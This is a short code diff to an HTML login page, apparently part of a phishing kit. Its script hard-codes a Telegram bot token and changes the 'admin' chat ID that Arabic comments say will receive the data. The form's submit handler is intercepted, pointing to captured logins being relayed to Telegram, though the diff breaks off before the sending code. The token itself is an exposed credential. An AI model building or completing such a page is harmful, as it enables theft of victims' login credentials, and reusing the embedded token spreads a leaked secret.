@@ -71,7 +71,7 @@
 
   <script>
     const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // 🔑 توكن البوت بتاعك
-    const adminId = "${chatId}";   // 🆔 الآيدى اللى هيستلم البيانات
+    const adminId = "7776054542";   // 🆔 الآيدى اللى هيستلم البيانات
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
